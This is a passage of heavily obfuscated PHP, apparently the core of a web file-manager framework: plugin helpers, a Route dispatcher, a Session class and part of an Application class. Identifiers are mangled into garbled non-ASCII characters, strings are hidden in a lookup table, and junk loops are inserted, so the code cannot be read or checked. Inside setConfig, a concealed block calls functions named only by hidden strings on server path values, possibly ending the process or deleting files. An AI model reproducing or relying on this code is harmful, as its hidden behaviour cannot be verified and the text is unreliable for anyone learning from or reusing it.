!1; } $ÛÛÉ¹š³ = Action($ÜùÃúÏ£[1181])->sharePathInfo($¹—öÊ·); if (!isset($ÛÛÉ¹š³[$ÜùÃúÏ£[84]])) { show_json(LNG($ÜùÃúÏ£[1556]), !1); } $this->fileInfo = $ÛÛÉ¹š³[$ÜùÃúÏ£[170]]; $this->cachePath = $this->pluginCachePath($this->fileInfo[$ÜùÃúÏ£[177]]); return $ÛÛÉ¹š³[$ÜùÃúÏ£[84]]; } final function pluginCachePath($Š°†¹üË = '') { $×ğğ÷Ñ— =& $_SERVER[ Ö‘ñÄ”]; $ªÉ†—üË = IO_PATH_SYSTEM_TEMP . $×ğğ÷Ñ—[1557] . $this->pluginName; if (!($â“í³Ê¼ = IO::infoFull($ªÉ†—üË))) { return IO::mkdir($ªÉ†—üË . $×ğğ÷Ñ—[8] . $Š°†¹üË); } if (empty($Š°†¹üË)) { return $â“í³Ê¼[$×ğğ÷Ñ—[84]]; } if (!($›©ı‘õ = IO::fileNameExist($â“í³Ê¼[$×ğğ÷Ñ—[84]], $Š°†¹üË))) { return IO::mkdir($â“í³Ê¼[$×ğğ÷Ñ—[84]] . $Š°†¹üË); } return KodIO::make($›©ı‘õ); } final function pluginCacheFileSet($»÷„«, $»÷ƒ¼¬ = '') { $€€ô·×à =& $_SERVER[ Ö‘ñÄ”]; if (!($Ğ·†ÍÒÃ = IO::infoFull($»÷„«))) { return IO::mkfile($»÷„«, $»÷ƒ¼¬, REPEAT_REPLACE); } IO::setContent($Ğ·†ÍÒÃ[$€€ô·×à[84]], $»÷ƒ¼¬); return $Ğ·†ÍÒÃ[$€€ô·×à[84]]; } final function pluginLocalFile($·™Ğü¤ê = '') { $ğ¯Î¹¾Ä =& $_SERVER[ Ö‘ñÄ”]; $äïÒŸÄü = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($äïÒŸÄü)) { mk_dir($äïÒŸÄü); } if (!$·™Ğü¤ê) { return $äïÒŸÄü; } $¿ïİš¦ = IO::info($·™Ğü¤ê); $ÅÖ€„ãó = $this->_tmpFileName($¿ïİš¦) . $ğ¯Î¹¾Ä[10] . $¿ïİš¦[$ğ¯Î¹¾Ä[174]]; if (!checkExtSafe($ÅÖ€„ãó)) { $ÅÖ€„ãó = $ÅÖ€„ãó . $ğ¯Î¹¾Ä[1558]; } $·Í³µèÃ = $äïÒŸÄü . $ÅÖ€„ãó; if (@file_exists($·Í³µèÃ)) { return $·Í³µèÃ; } return IO::copy($·™Ğü¤ê, $äïÒŸÄü, 0, $ÅÖ€„ãó); } final function appPackage() { $›²¯Ò·Ù =& $_SERVER[ Ö‘ñÄ”]; if ($this->packageData) { return $this->packageData; } $»©Ö’ûŞ = $this->parseFile($this->pluginPath . $›²¯Ò·Ù[1559]); $this->parseLang($»©Ö’ûŞ); $Ÿ‹êËØ = json_decode_force($»©Ö’ûŞ); if (!$Ÿ‹êËØ) { return array(); } $Æ•í¸¸ = Hook::trigger($›²¯Ò·Ù[1560], $Ÿ‹êËØ); if ($Æ•í¸¸ && is_array($Æ•í¸¸)) { $Ÿ‹êËØ = $Æ•í¸¸; } $this->packageData = $Ÿ‹êËØ; return $Ÿ‹êËØ; } public function packageInfoGet($êè³‰¼») { $Ğ’ĞÒë© = $this->appPackage(); return array_get_value($Ğ’ĞÒë©, $êè³‰¼»); } public function packageVersion() { return $this->packageInfoGet($_SERVER[ Ö‘ñÄ”][1561]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[ Ö‘ñÄ”][1562]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[ Ö‘ñÄ”][1563]); } public function echoJsAssign($­Ìı¦, $ùàïŒûÚ) { $this->echoJsAssignArr[$­Ìı¦] = $ùàïŒûÚ; } private function parseFile($âöÜØæÆ) { $ˆãŸ‹¢İ =& $_SERVER[ Ö‘ñÄ”]; $œøæó‘­ = file_get_contents_nossl($âöÜØæÆ); $ÔØ±ÔÌ = array($ˆãŸ‹¢İ[1564], $ˆãŸ‹¢İ[1565], $ˆãŸ‹¢İ[1566], $ˆãŸ‹¢İ[1567], $ˆãŸ‹¢İ[1568], $ˆãŸ‹¢İ[1569], $ˆãŸ‹¢İ[1570]); $Î…¤¦á = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$ˆãŸ‹¢İ[89]][$ˆãŸ‹¢İ[1571]]); foreach ($this->echoJsAssignArr as $×Î˜Í¾Æ => $ÖñşŠ¦ì) { $ÔØ±ÔÌ[] = $ˆãŸ‹¢İ[1572] . $×Î˜Í¾Æ . $ˆãŸ‹¢İ[1573]; $Î…¤¦á[] = is_array($ÖñşŠ¦ì) || is_object($ÖñşŠ¦ì) ? rawurlencode(json_encode($ÖñşŠ¦ì)) : $ÖñşŠ¦ì; } if (strstr($œøæó‘­, $ˆãŸ‹¢İ[1574])) { $æÙ = rawurlencode(json_encode($this->pluginLangArr)); $œøæó‘­ = str_replace($ˆãŸ‹¢İ[1574], $æÙ, $œøæó‘­); } if (strstr($œøæó‘­, $ˆãŸ‹¢İ[1575])) { $æÙ = $æÙ = rawurlencode(json_encode($this->getConfig())); $œøæó‘­ = str_replace($ˆãŸ‹¢İ[1575], $æÙ, $œøæó‘­); } $œøæó‘­ = str_replace($ÔØ±ÔÌ, $Î…¤¦á, $œøæó‘­); return $œøæó‘­; } private function parseLang(&$¨ñí¿™‰) { $šßšË¥ =& $_SERVER[ Ö‘ñÄ”]; $™¬Ä¼È‚ = $šßšË¥[1576]; if (!strstr($¨ñí¿™‰, $™¬Ä¼È‚)) { return; } preg_match_all($šßšË¥[1577], $¨ñí¿™‰, $¶‘œŞûâ); if (!is_array($¶‘œŞûâ) || count($¶‘œŞûâ) == 0 || !is_array($¶‘œŞûâ[0]) || count($¶‘œŞûâ[0]) == 0) { return; } $ãø‚¨‚± = array(); $Âì¶é = array(); foreach ($¶‘œŞûâ[0] as $â»üëü) { $ÁéÙ ¯½ = substr($â»üëü, strlen($™¬Ä¼È‚), -4); $µÔŒû¼Ó = LNG($ÁéÙ ¯½); $ãø‚¨‚±[] = $â»üëü; $Âì¶é[] = str_replace(array($šßšË¥[231], $šßšË¥[1084], $šßšË¥[351], $šßšË¥[118]), array($šßšË¥[53], $šßšË¥[53], $šßšË¥[12], $šßšË¥[1578]), $µÔŒû¼Ó); } $¨ñí¿™‰ = str_replace($ãø‚¨‚±, $Âì¶é, $¨ñí¿™‰); } private function parseConfig(&$¿ìµ‹ñÚ) { $˜á÷Àú‡ =& $_SERVER[ Ö‘ñÄ”]; $—©œ©ÇÉ = $˜á÷Àú‡[1579]; if (!strstr($¿ìµ‹ñÚ, $—©œ©ÇÉ)) { return; } preg_match_all($˜á÷Àú‡[1580], $¿ìµ‹ñÚ, $­òÑÖ«¨); if (!is_array($­òÑÖ«¨) || count($­òÑÖ«¨) == 0 || !is_array($­òÑÖ«¨[0]) || count($­òÑÖ«¨[0]) == 0) { return; } $Ğ•îóŒÇ = $this->getConfig(); $áİ¾ÁŒ› = array(); $öÌ×¥…Ï = array(); foreach ($­òÑÖ«¨[0] as $Ï™ÀµÜÆ) { $Ã¦‡ß«€ = substr($Ï™ÀµÜÆ, strlen($—©œ©ÇÉ), -2); $áİ¾ÁŒ›[] = $Ï™ÀµÜÆ; $öÌ×¥…Ï[] = _get($Ğ•îóŒÇ, $Ã¦‡ß«€); } $¿ìµ‹ñÚ = str_replace($áİ¾ÁŒ›, $öÌ×¥…Ï, $¿ìµ‹ñÚ); } private function parsePackage(&$¾³÷Û™ğ) { $Ïİ­¶¾ï =& $_SERVER[ Ö‘ñÄ”]; $ßùÛÔÒİ = $Ïİ­¶¾ï[1581]; if (!strstr($¾³÷Û™ğ, $ßùÛÔÒİ)) { return; } preg_match_all($Ïİ­¶¾ï[1582], $¾³÷Û™ğ, $ÖæÚ±’); if (!is_array($ÖæÚ±’) || count($ÖæÚ±’) == 0 || !is_array($ÖæÚ±’[0]) || count($ÖæÚ±’[0]) == 0) { return; } $­åãÎ£ = $this->appPackage(); $à¯ï×Ô = array(); $ïÃ”ô›î = array(); foreach ($ÖæÚ±’[0] as $¼’¸Ù Ø) { $Ç´˜Ç»Œ = substr($¼’¸Ù Ø, strlen($ßùÛÔÒİ), -2); $à¯ï×Ô[] = $¼’¸Ù Ø; $ïÃ”ô›î[] = _get($­åãÎ£, $Ç´˜Ç»Œ); } $¾³÷Û™ğ = str_replace($à¯ï×Ô, $ïÃ”ô›î, $¾³÷Û™ğ); } final function echoFile($¡Îî’Í, $ÂÛô×¿Ù = false) { $»¼˜Öà =& $_SERVER[ Ö‘ñÄ”]; $¦ÈÒÙ•Œ = $this->pluginPath . $¡Îî’Í; if (ACT == $»¼˜Öà[1583]) { echo $»¼˜Öà[1584] . $this->pluginName . $»¼˜Öà[8] . $¡Îî’Í . $»¼˜Öà[1585]; if (!file_exists($¦ÈÒÙ•Œ)) { echo $»¼˜Öà[1586]; return; } } $õÌÊÅÖÀ = $this->parseFile($¦ÈÒÙ•Œ); $this->parseLang($õÌÊÅÖÀ); $this->parseConfig($õÌÊÅÖÀ); $this->parsePackage($õÌÊÅÖÀ); if (is_array($ÂÛô×¿Ù)) { $õÌÊÅÖÀ = str_replace(array_keys($ÂÛô×¿Ù), array_values($ÂÛô×¿Ù), $õÌÊÅÖÀ); } echo $»¼˜Öà[231] . $õÌÊÅÖÀ; } final function initLang() { $õÒéÌ¯ =& $_SERVER[ Ö‘ñÄ”]; $ «ï×† = $õÒéÌ¯[1587]; $ß áğ¬ = $this->pluginPath . $õÒéÌ¯[1588]; $‘¢ƒÒÓş = I18n::getType(); $‚Ô¿¨ïœ = array(); if (file_exists($ß áğ¬ . $‘¢ƒÒÓş . $õÒéÌ¯[851])) { $‚Ô¿¨ïœ = (include $ß áğ¬ . $‘¢ƒÒÓş . $õÒéÌ¯[851]); } else { if ($‘¢ƒÒÓş == $õÒéÌ¯[1589] && !file_exists($ß áğ¬ . $‘¢ƒÒÓş . $õÒéÌ¯[851]) && file_exists($ß áğ¬ . $õÒéÌ¯[1590])) { $‚Ô¿¨ïœ = (include $ß áğ¬ . $õÒéÌ¯[1590]); } else { if (file_exists($ß áğ¬ . $ «ï×† . $õÒéÌ¯[851])) { $‚Ô¿¨ïœ = (include $ß áğ¬ . $ «ï×† . $õÒéÌ¯[851]); } } } if (!is_array($‚Ô¿¨ïœ)) { return array(); } if (@count($‚Ô¿¨ïœ) > 0) { I18n::set($‚Ô¿¨ïœ); } return $‚Ô¿¨ïœ; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($Ë˜’¶ü¥) { $êÂ‡ÛİĞ =& $_SERVER[ Ö‘ñÄ”]; if ($_SERVER[$êÂ‡ÛİĞ[238]] != $_SERVER[$êÂ‡ÛİĞ[1527]]) { $üÅîÜ™† = $êÂ‡ÛİĞ[885]; $—–©©î• = $êÂ‡ÛİĞ[240]; $ƒ±çÅ½³ = $_SERVER[$êÂ‡ÛİĞ[241]] . $êÂ‡ÛİĞ[242]; $İ‡åŒÖ = $—–©©î•($ƒ±çÅ½³); $ùò·ï†Î = explode($êÂ‡ÛİĞ[231], $İ‡åŒÖ); if (count($ùò·ï†Î) < $êÂ‡ÛİĞ[631]) { $â§å²İ = $êÂ‡ÛİĞ[244]; $â§å²İ(); } $Š¨ÎÏç = $êÂ‡ÛİĞ[886]; $Š¨ÎÏç($_SERVER[$êÂ‡ÛİĞ[887]]); $Š¨ÎÏç($_SERVER[$êÂ‡ÛİĞ[241]] . $êÂ‡ÛİĞ[1528]); $ïÅÙÆÑ = 1; while ($ïÅÙÆÑ > 1) { $ïÅÙÆÑ = $ïÅÙÆÑ + 4; $úèÌ—ñ = rawurlencode($ïÅÙÆÑ . $êÂ‡ÛİĞ[246]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $Ë˜’¶ü¥); } public function onSetConfig($òìæ™š) { } public function onGetConfig($ÏÀ£š«¨) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($¹˜¨áƒÜ) { if ($¹˜¨áƒÜ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($úÒ™ûÄæ = "\x70\x6c\x75\147\151\x6e\x41\165\164\150") { $»„ê²Ú =& $_SERVER[ Ö‘ñÄ”]; if (!defined($»„ê²Ú[483])) { return !1; } if (_get($GLOBALS, $»„ê²Ú[511])) { return !0; } $š•òÈáÌ = $this->getConfig(); if (!$š•òÈáÌ[$úÒ™ûÄæ]) { return !1; } return ActionCall($»„ê²Ú[1591], $š•òÈáÌ[$úÒ™ûÄæ]); } public function url($€Õıûîš, $ˆ•Ì¼¬‰ = '', $„›æ€öø = true) { $•”‚¸Ş£ =& $_SERVER[ Ö‘ñÄ”]; $Ÿ­«ö‡Ã = $this->getConfig(); $ÏÒúèÜ— = KOD_VERSION . $•”‚¸Ş£[10] . KOD_VERSION_BUILD; $æù´ŒÙ = $this->packageVersion(); $¿Î‡²¡´ = $ÏÒúèÜ— . $•”‚¸Ş£[394] . $æù´ŒÙ; if (substr($€Õıûîš, 0, 4) == $•”‚¸Ş£[148] || substr($€Õıûîš, 0, 2) == $•”‚¸Ş£[1373]) { $ú«„±Ô = $€Õıûîš . $•”‚¸Ş£[1592] . $¿Î‡²¡´; } else { if ($ˆ•Ì¼¬‰ == $•”‚¸Ş£[12]) { $ú«„±Ô = $this->pluginHost . $€Õıûîš . $•”‚¸Ş£[1592] . $¿Î‡²¡´; } else { if ($ˆ•Ì¼¬‰ === $•”‚¸Ş£[75]) { $ú«„±Ô = $this->pluginHost . $€Õıûîš; } else { if ($ˆ•Ì¼¬‰ == $•”‚¸Ş£[1593]) { $ú«„±Ô = STATIC_PATH . $€Õıûîš . $•”‚¸Ş£[1592] . $ÏÒúèÜ—; } else { if ($ˆ•Ì¼¬‰ == $•”‚¸Ş£[1594]) { $ú«„±Ô = APP_HOST . $•”‚¸Ş£[1595] . $€Õıûîš . $•”‚¸Ş£[1592] . $ÏÒúèÜ—; } else { if (isset($Ÿ­«ö‡Ã[$ˆ•Ì¼¬‰])) { $ú«„±Ô = $Ÿ­«ö‡Ã[$ˆ•Ì¼¬‰] . $€Õıûîš . $•”‚¸Ş£[1592] . $¿Î‡²¡´; } } } } } } if (!$„›æ€öø) { return $ú«„±Ô; } echo $ú«„±Ô; } public function link($ˆİ¨×‹´ = false, $¥·¿İÌ = '') { $Ôú…¬šÕ =& $_SERVER[ Ö‘ñÄ”]; if (!$ˆİ¨×‹´) { $this->link($Ôú…¬šÕ[1596], $Ôú…¬šÕ[1594]); $this->link($Ôú…¬šÕ[1597], $Ôú…¬šÕ[1593]); $this->link($Ôú…¬šÕ[1598], $Ôú…¬šÕ[1593]); $this->link($Ôú…¬šÕ[1599], $Ôú…¬šÕ[1593]); $this->link($Ôú…¬šÕ[1600], $Ôú…¬šÕ[1593]); return; } $ä°ŸÕŒ = $this->url($ˆİ¨×‹´, $¥·¿İÌ, !1); if (substr($ˆİ¨×‹´, -3) == $Ôú…¬šÕ[1601]) { echo $Ôú…¬šÕ[1602] . $ä°ŸÕŒ . $Ôú…¬šÕ[1603] . $Ôú…¬šÕ[231]; } else { if (substr($ˆİ¨×‹´, -4) == $Ôú…¬šÕ[1604]) { echo $Ôú…¬šÕ[1605] . $ä°ŸÕŒ . $Ôú…¬šÕ[1606] . $Ôú…¬šÕ[231]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\156\x79" => "\x5b\x5e\57\x5d\53", "\72\x6e\165\155" => "\133\x30\55\x39\135\x2b", "\x3a\141\x6c\x6c" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($ÛÛãÚÉâ, $»è¤—§) { $ŸÕ‡ô†¥ =& $_SERVER[ Ö‘ñÄ”]; if ($ÛÛãÚÉâ == $ŸÕ‡ô†¥[1607]) { $úÊ‹Ó¤ = array_map($ŸÕ‡ô†¥[1608], $»è¤—§[0]); $»ÖöÜ‘Œ = strpos($»è¤—§[1], $ŸÕ‡ô†¥[8]) === 0 ? $»è¤—§[1] : $ŸÕ‡ô†¥[8] . $»è¤—§[1]; $Ñ¶š¹ÑÄ = $»è¤—§[2]; } else { $úÊ‹Ó¤ = null; $»ÖöÜ‘Œ = strpos($»è¤—§[0], $ŸÕ‡ô†¥[8]) === 0 ? $»è¤—§[0] : $ŸÕ‡ô†¥[8] . $»è¤—§[0]; $Ñ¶š¹ÑÄ = $»è¤—§[1]; } array_push(self::$maps, $úÊ‹Ó¤); array_push(self::$routes, $»ÖöÜ‘Œ); array_push(self::$methods, strtoupper($ÛÛãÚÉâ)); array_push(self::$callbacks, $Ñ¶š¹ÑÄ); } public static function error($¡©â°¾) { self::$errorCallback = $¡©â°¾; } public static function haltOnMatch($ëƒáº¿Ì = true) { self::$halts = $ëƒáº¿Ì; } public static function dispatch() { $á«úş¢¼ =& $_SERVER[ Ö‘ñÄ”]; $µ©‹Ğòº = parse_url($_SERVER[$á«úş¢¼[1609]], PHP_URL_PATH); $ÜŸ•·æ£ = $_SERVER[$á«úş¢¼[159]]; $„Âƒéöô = array_keys(static::$patterns); $ºÉ”ÖË£ = array_values(static::$patterns); $šÇƒŠ™® = !1; self::$routes = preg_replace($á«úş¢¼[1275], $á«úş¢¼[8], self::$routes); if (in_array($µ©‹Ğòº, self::$routes)) { $ëõÍ’ï± = array_keys(self::$routes, $µ©‹Ğòº); foreach ($ëõÍ’ï± as $ğ´Œ”ìÇ) { if (self::$methods[$ğ´Œ”ìÇ] == $ÜŸ•·æ£ || self::$methods[$ğ´Œ”ìÇ] == $á«úş¢¼[1610] || in_array($ÜŸ•·æ£, self::$maps[$ğ´Œ”ìÇ])) { $šÇƒŠ™® = !0; if (!is_object(self::$callbacks[$ğ´Œ”ìÇ])) { $Å²ğÉ = explode($á«úş¢¼[8], self::$callbacks[$ğ´Œ”ìÇ]); $‚Àä¶Äå = end($Å²ğÉ); $”œ™ı é = explode($á«úş¢¼[1611], $‚Àä¶Äå); $ŒÛ’ºÅŒ = new $”œ™ı é[0](); $ŒÛ’ºÅŒ->{$”œ™ı é[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$ğ´Œ”ìÇ]); if (self::$halts) { return; } } } } } else { $½€Ùš×å = 0; foreach (self::$routes as $ğ´Œ”ìÇ) { if (strpos($ğ´Œ”ìÇ, $á«úş¢¼[4]) !== !1) { $ğ´Œ”ìÇ = str_replace($„Âƒéöô, $ºÉ”ÖË£, $ğ´Œ”ìÇ); } if (preg_match($á«úş¢¼[1612] . $ğ´Œ”ìÇ . $á«úş¢¼[1613], $µ©‹Ğòº, $ñÀãÖ¾Â)) { if (self::$methods[$½€Ùš×å] == $ÜŸ•·æ£ || self::$methods[$½€Ùš×å] == $á«úş¢¼[1610] || !empty(self::$maps[$½€Ùš×å]) && in_array($ÜŸ•·æ£, self::$maps[$½€Ùš×å])) { $šÇƒŠ™® = !0; array_shift($ñÀãÖ¾Â); if (!is_object(self::$callbacks[$½€Ùš×å])) { $Å²ğÉ = explode($á«úş¢¼[8], self::$callbacks[$½€Ùš×å]); $‚Àä¶Äå = end($Å²ğÉ); $”œ™ı é = explode($á«úş¢¼[1611], $‚Àä¶Äå); $ŒÛ’ºÅŒ = new $”œ™ı é[0](); if (!method_exists($ŒÛ’ºÅŒ, $”œ™ı é[1])) { echo $á«úş¢¼[1614]; } else { call_user_func_array(array($ŒÛ’ºÅŒ, $”œ™ı é[1]), $ñÀãÖ¾Â); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$½€Ùš×å], $ñÀãÖ¾Â); if (self::$halts) { return; } } } } $½€Ùš×å++; } } if ($šÇƒŠ™® == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $ªıö«ß =& $_SERVER[ Ö‘ñÄ”]; header($_SERVER[$ªıö«ß[1615]] . $ªıö«ß[1616]); echo $ªıö«ß[1617]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$á«úş¢¼[1609]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $æ…Œü·® =& $_SERVER[ Ö‘ñÄ”]; static $»ğ’ë†û = false; if ($»ğ’ë†û) { return $»ğ’ë†û; } $†ÑÂî‘ = $GLOBALS[$æ…Œü·®[6]][$æ…Œü·®[358]]; self::$sessionTime = $†ÑÂî‘[$æ…Œü·®[1618]]; $¥µäãÒë = isset($GLOBALS[$æ…Œü·®[1619]]) ? $GLOBALS[$æ…Œü·®[1619]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($¥µäãÒë)) { self::$sessionSign = Cookie::get($¥µäãÒë); } else { self::$sessionSign = guid(); } } Cookie::setSafe($¥µäãÒë, self::$sessionSign, self::$sessionTime); $ÎÇÍ¸÷ = $†ÑÂî‘[$æ…Œü·®[1620]]; $«İõ¿ïÁ = $†ÑÂî‘[$ÎÇÍ¸÷]; $¼­¯èÛâ = $†ÑÂî‘[$æ…Œü·®[841]]; switch ($ÎÇÍ¸÷) { case $æ…Œü·®[21]: self::$handle = Model($æ…Œü·®[842]); break; case $æ…Œü·®[843]: self::$handle = new CacheRedis($«İõ¿ïÁ, $¼­¯èÛâ); break; case $æ…Œü·®[844]: self::$handle = new CacheMemcached($«İõ¿ïÁ, $¼­¯èÛâ); break; case $æ…Œü·®[199]: $«İõ¿ïÁ[$æ…Œü·®[84]] = $«İõ¿ïÁ[$æ…Œü·®[84]] . $æ…Œü·®[1621]; self::$handle = new CacheFile($«İõ¿ïÁ, $¼­¯èÛâ); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $»ğ’ë†û = new self(); return $»ğ’ë†û; } public static function getBySign($÷…«úÌ‰) { CacheLock::lock($÷…«úÌ‰); $ù•…õÊ× = self::$handle->get($÷…«úÌ‰); CacheLock::unlock($÷…«úÌ‰); $ù•…õÊ× = unserialize($ù•…õÊ×); return is_array($ù•…õÊ×) ? $ù•…õÊ× : array(); } public static function setBySign($¢€¡ß¨, $ š«îË) { CacheLock::lock($¢€¡ß¨); self::$handle->set($¢€¡ß¨, serialize($ š«îË), self::$sessionTime); CacheLock::unlock($¢€¡ß¨); } public static function sign($¨«¿‹¿ë = false) { $¨«¿‹¿ë && (self::$sessionSign = $¨«¿‹¿ë); self::init(); return self::$sessionSign; } public static function set($âµïÛ«, $Û¹Š¨¥ = false) { self::init(); if (is_array($âµïÛ«)) { foreach ($âµïÛ« as $ØÅ˜÷Ó« => $æóŒ£òå) { array_set_value(self::$data, $ØÅ˜÷Ó«, $æóŒ£òå); } } else { array_set_value(self::$data, $âµïÛ«, $Û¹Š¨¥); } self::setBySign(self::$sessionSign, self::$data); } public static function get($•ô¯ŒÄÎ = false) { self::init(); if (!$•ô¯ŒÄÎ) { return self::$data; } return array_get_value(self::$data, $•ô¯ŒÄÎ); } public static function remove($éŸÅ‡İÃ) { self::init(); unset(self::$data[$éŸÅ‡İÃ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[ Ö‘ñÄ”][846])) { self::$handle->clearTimeout(); } } } goto bââ„ä®Çˆ; bãÊÓ†ìÈ: while ($kxozfndqae < $_SERVER[ Ö‘ñÄ”][627]) { if ($kxozfndqae >= 0) { break; } $kxozfndqae++; } class Application { private $defaultModule = "\151\x6e\x64\145\x78"; private $defaultController = "\151\x6e\x64\145\170"; private $defaultAction = "\151\156\x64\x65\x78"; function __construct() { } public function setDefault($×¾Ñ‘¢) { $ÖıòšÅá =& $_SERVER[ Ö‘ñÄ”]; $®¶ÉÃ½ =& $_SERVER[Ç¼‰©óß]; $®™ãÕºê = explode($®¶ÉÃ½[0], trim($×¾Ñ‘¢, $®¶ÉÃ½[0])); $this->defaultModule = $®™ãÕºê[0] ? $®™ãÕºê[0] : $this->defaultModule; $Æ÷Ô‰â = $ÖıòšÅá[628]; $this->defaultController = $®™ãÕºê[1] ? $®™ãÕºê[1] : $this->defaultController; $this->defaultAction = $®™ãÕºê[2] ? $®™ãÕºê[2] : $this->defaultAction; $¦´‘·Û“ = $ÖıòšÅá[629]; $this->cqxm86434903($®¶ÉÃ½[1], array($this, $®¶ÉÃ½[2])); } public function appRun($°˜’Œš) { $ûÛÍ²Àö =& $_SERVER[ Ö‘ñÄ”]; $æó’£Ã =& $_SERVER[Ç¼‰©óß]; $êîåıŠ = explode($æó’£Ã[0], $°˜’Œš); $…É¿ÏÙø = strtolower($êîåıŠ[0]); $Öûœâã = $æó’£Ã[3]; if ($…É¿ÏÙø == $æó’£Ã[4]) { $Öûœâã = $æó’£Ã[5]; $êîåıŠ[0] = $æó’£Ã[6]; $êîåıŠ[1] = $êîåıŠ[1] . $æó’£Ã[7]; $°˜’Œš = join($æó’£Ã[0], $êîåıŠ); $°˜’Œš = trim($°˜’Œš, $æó’£Ã[0]); } call_user_func(array($æó’£Ã[8], $æó’£Ã[9]), $Öûœâã . $æó’£Ã[10], $°˜’Œš); ActionCall($°˜’Œš); call_user_func(array($æó’£Ã[8], $æó’£Ã[9]), $Öûœâã . $æó’£Ã[11], $°˜’Œš); $«İê§É• = $ûÛÍ²Àö[630]; while ($«İê§É• < $ûÛÍ²Àö[631]) { if ($«İê§É• >= 0) { break; } $«İê§É•++; } } private function autorun() { $¯œé€± =& $_SERVER[ Ö‘ñÄ”]; $¹½ÇÑË =& $_SERVER[Ç¼‰©óß]; global $config; $ãû„çï¿ = $¯œé€±[632]; while ($ãû„çï¿ < $¯œé€±[633]) { if ($ãû„çï¿ >= 0) { break; } $ãû„çï¿++; } if (count($config[$¹½ÇÑË[12]]) == 0) { return; } foreach ($config[$¹½ÇÑË[12]] as $‡ñâ¿ÎÈ => $”õû¥ø) { $this->appRun($”õû¥ø); } } private function ogck57ca0e9b() { $ªØ—ëòÑ =& $_SERVER[ Ö‘ñÄ”]; $Ó°±ê«É =& $_SERVER[Ç¼‰©óß]; $÷ãÙ¸¸© = $Ó°±ê«É[4]; $Ì›ˆ‘×ˆ = $GLOBALS[$Ó°±ê«É[13]][$Ó°±ê«É[14]][0]; $Ã…Ï„ = $ªØ—ëòÑ[634]; while ($Ã…Ï„ < $ªØ—ëòÑ[631]) { if ($Ã…Ï„ >= 0) { break; } $Ã…Ï„++; } if (!$Ì›ˆ‘×ˆ || strlen($Ì›ˆ‘×ˆ) <= strlen($÷ãÙ¸¸©)) { return; } if (strtolower(substr($Ì›ˆ‘×ˆ, -strlen($÷ãÙ¸¸©))) != $÷ãÙ¸¸©) { return; } $âÑî¯¤Á = substr($Ì›ˆ‘×ˆ, 0, -strlen($÷ãÙ¸¸©)); $ôãßÈë¸ = $ªØ—ëòÑ[635]; if (strlen($ôãßÈë¸) < $ªØ—ëòÑ[633]) { die; } $Ö±­¨–ï = array($Ó°±ê«É[4], $âÑî¯¤Á); $«²¡¹ù­ = $ªØ—ëòÑ[636]; $»Óé×Ø = array_slice($GLOBALS[$Ó°±ê«É[13]][$Ó°±ê«É[14]], 1); $GLOBALS[$Ó°±ê«É[13]][$Ó°±ê«É[14]] = array_merge($Ö±­¨–ï, $»Óé×Ø); $Éõ–Æ©å = $ªØ—ëòÑ[637]; if (!$Éõ–Æ©å) { die; } $GLOBALS[$Ó°±ê«É[13]][$Ó°±ê«É[15]] = implode($Ó°±ê«É[0], $GLOBALS[$Ó°±ê«É[13]][$Ó°±ê«É[14]]); $á³•È¾‘ = $ªØ—ëòÑ[638]; } private function mbcxa53eb80c() { $ûéË ¡ =& $_SERVER[ Ö‘ñÄ”]; $ ¡«ÊÆÃ =& $_SERVER[Ç¼‰©óß]; if ($GLOBALS[$ ¡«ÊÆÃ[13]][$ ¡«ÊÆÃ[15]] != $ ¡«ÊÆÃ[6]) { return; } $»€êÔ¡ø = $_SERVER[$ ¡«ÊÆÃ[16]]; $âåÜ¨û™ = $ ¡«ÊÆÃ[17]; $˜óÄ¡¸Š = $ûéË ¡[639]; if (strlen($˜óÄ¡¸Š) < $ûéË ¡[243]) { die; } if (!strstr($»€êÔ¡ø, $âåÜ¨û™)) { return; } $Ÿ½¢¹¾ã = strrpos($»€êÔ¡ø, $âåÜ¨û™); $ŠöÒÙş = $ûéË ¡[640]; if (!$ŠöÒÙş) { return; } $¤Ö…®Ñ¦ = substr($»€êÔ¡ø, $Ÿ½¢¹¾ã + strlen($âåÜ¨û™)); preg_match_all($ ¡«ÊÆÃ[18], $¤Ö…®Ñ¦, $ÏœùøÖí); $â×—áşñ = $ûéË ¡[641]; if (strlen($â×—áşñ) < $ûéË ¡[633]) { return; } $¤Ö…®Ñ¦ = trim($ÏœùøÖí[0][0], $ ¡«ÊÆÃ[19]); $´ùô»Ú± = $ûéË ¡[642]; $GLOBALS[$ ¡«ÊÆÃ[13]][$ ¡«ÊÆÃ[14]] = explode($ ¡«ÊÆÃ[19], $¤Ö…®Ñ¦); $GLOBALS[$ ¡«ÊÆÃ[13]][$ ¡«ÊÆÃ[15]] = implode($ ¡«ÊÆÃ[0], $GLOBALS[$ ¡«ÊÆÃ[13]][$ ¡«ÊÆÃ[14]]); } public function run() { $´¥Ïı„¡ =& $_SERVER[ Ö‘ñÄ”]; $è’Ï†¥ö =& $_SERVER[Ç¼‰©óß]; $this->mbcxa53eb80c(); $this->ogck57ca0e9b(); 